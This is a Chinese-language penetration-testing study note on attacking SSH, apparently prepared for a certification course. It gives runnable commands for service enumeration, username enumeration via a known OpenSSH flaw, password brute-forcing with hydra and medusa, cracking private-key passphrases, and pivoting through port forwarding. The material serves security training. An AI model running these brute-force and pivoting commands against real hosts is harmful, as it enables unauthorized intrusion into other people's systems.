# 第 52 章 - SSH

## 標籤

- #cpts
- #chapter
- #ssh
- #linux
- #services

## 學習目標

- 理解 SSH 暴露的偵察與攻擊面：banner、演算法、使用者枚舉、金鑰。
- 能用 nmap 列舉 SSH 演算法與 host key。
- 能用 hydra / medusa 暴力破解 SSH 密碼。
- 能使用找到的私鑰或金鑰繞過密碼登入。

---

## 理論基礎

```text
SSH（Secure Shell）：
  Port: 22/tcp（預設）、也可能在 2222 或其他非標準埠
  加密的遠端管理協定，用於 Linux/Unix 主機

高價值攻擊面：
  1. 弱密碼或預設憑證
  2. 找到私鑰（id_rsa）→ 直接登入
  3. 使用者枚舉（舊版 OpenSSH timing side-channel）
  4. 過時演算法（CBC / MD5 / Diffie-Hellman group 1）→ 降級攻擊
  5. SSH 跳板 / Port Forwarding → 穿透防火牆存取內網

常見找到私鑰的地方：
  .ssh/id_rsa（使用者家目錄）
  /backup/*.pem / *.key
  NFS 掛載的家目錄
  Git 倉庫（意外提交的私鑰）
  SMB 分享中的部署腳本
```

---

## 方法一：服務發現與資訊收集

```bash
# 掃描 SSH（含非標準埠）
nmap -sV -p 22,2222 TARGET_IP
# 看 banner（OpenSSH 版本）

# NSE 腳本：演算法與 host key
nmap --script ssh2-enum-algos,ssh-hostkey -p 22 TARGET_IP
# ssh2-enum-algos → 列出伺服器支援的加密/MAC/KEX 演算法
# ssh-hostkey     → 顯示伺服器的 host key fingerprint

# 手動 banner 取得
nc -nv TARGET_IP 22
# 直接看 SSH banner：SSH-2.0-OpenSSH_7.4p1 Debian-10

# 詳細握手資訊
ssh -v user@TARGET_IP 2>&1 | head -30
# -v → verbose（顯示握手過程，包括支援的認證方式）
# 看 "Authentications that can continue: publickey,password"
```

---

## 方法二：使用者枚舉（舊版 OpenSSH）

```bash
# CVE-2018-15473：OpenSSH < 7.7 存在 timing-based 使用者枚舉
# 工具：ssh-user-enum（Python）

python3 ssh_user_enum.py --userList /usr/share/seclists/Usernames/Names/names.txt \
  --ip TARGET_IP --port 22
# 存在的使用者回應時間較短（timing side-channel）

# 也可用 Metasploit
# use auxiliary/scanner/ssh/ssh_enumusers
# set RHOSTS TARGET_IP
# set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

---

## 方法三：暴力破解 SSH 密碼

```bash
# hydra SSH 暴力破解
hydra -l root -P /usr/share/wordlists/rockyou.txt \
  ssh://TARGET_IP
# -l root → 目標使用者
# 注意：SSH 通常有速率限制，建議 -t 4

hydra -l root -P /usr/share/wordlists/rockyou.txt \
  ssh://TARGET_IP -t 4 -v
# -t 4 → 4 個平行執行緒
# -v → 詳細輸出（看嘗試過程）

# 多使用者
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
  ssh://TARGET_IP -t 4

# medusa（替代工具）
medusa -h TARGET_IP -u root -P /usr/share/wordlists/rockyou.txt \
  -M ssh -t 3

# nmap NSE 暴力破解
nmap --script ssh-brute -p 22 TARGET_IP \
  --script-args userdb=users.txt,passdb=/usr/share/wordlists/rockyou.txt
```

---

## 方法四：使用私鑰登入

```bash
# 若找到 id_rsa（私鑰）
# 先確認權限（SSH 要求私鑰權限為 600）
chmod 600 /tmp/id_rsa

# 用私鑰登入
ssh -i /tmp/id_rsa user@TARGET_IP
# -i → 指定私鑰檔案

# 若私鑰有密碼保護，用 ssh2john 提取 hash 再 hashcat/john
ssh2john /tmp/id_rsa > /tmp/id_rsa.hash
john /tmp/id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
# 或
hashcat -m 22931 /tmp/id_rsa.hash /usr/share/wordlists/rockyou.txt
# -m 22931 → SSH 私鑰密碼 hash 模式

# 找到密碼後
ssh -i /tmp/id_rsa user@TARGET_IP
# 輸入 john 破解出的密碼
```

---

## 方法五：SSH Port Forwarding（穿透內網）

```bash
# Local Port Forwarding：把本機 port 轉發到目標內網服務
ssh -L 8080:INTERNAL_HOST:80 user@TARGET_IP
# -L 8080:INTERNAL_HOST:80
# → 連本機 localhost:8080 等於連 TARGET_IP 看到的 INTERNAL_HOST:80

# 存取內網 Web 服務
# curl http://localhost:8080

# Dynamic Port Forwarding（SOCKS proxy）
ssh -D 1080 user@TARGET_IP
# -D 1080 → 在本機開 SOCKS5 proxy
# 設定 proxychains 指向 127.0.0.1:1080
# 然後：proxychains nmap -sT INTERNAL_NETWORK/24

# Remote Port Forwarding（反向隧道）
ssh -R 4444:localhost:4444 user@TARGET_IP
# → 目標主機的 4444 port 轉回攻擊機的 4444
```

---

## 決策流程

```
nmap -p 22 確認 SSH + banner 版本
    ↓
ssh -v → 確認支援的認證方式
    ↓
有找到私鑰？
  → 是：chmod 600 → ssh -i key user@TARGET
        有密碼？→ ssh2john → john 破解
  → 否：hydra -l user -P rockyou.txt ssh://TARGET -t 4
    ↓
登入後：
  sudo -l / id / whoami
  找其他使用者的 .ssh/
  利用 Port Forwarding 進入內網
```

---

## 速查表

```bash
# 服務識別
nmap -sV --script ssh2-enum-algos,ssh-hostkey -p 22 TARGET_IP

# 暴力破解
hydra -l root -P rockyou.txt ssh://TARGET_IP -t 4

# 私鑰登入
chmod 600 id_rsa && ssh -i id_rsa user@TARGET_IP

# 私鑰密碼破解
ssh2john id_rsa > hash && john hash --wordlist=rockyou.txt

# Local Port Forwarding
ssh -L LOCAL_PORT:INTERNAL_HOST:REMOTE_PORT user@TARGET_IP

# Dynamic SOCKS proxy
ssh -D 1080 user@TARGET_IP
```

---

## 關聯筆記

- [[05-Volume-5-Common-Services-Index|Vol.5 - Attacking Common Services]]
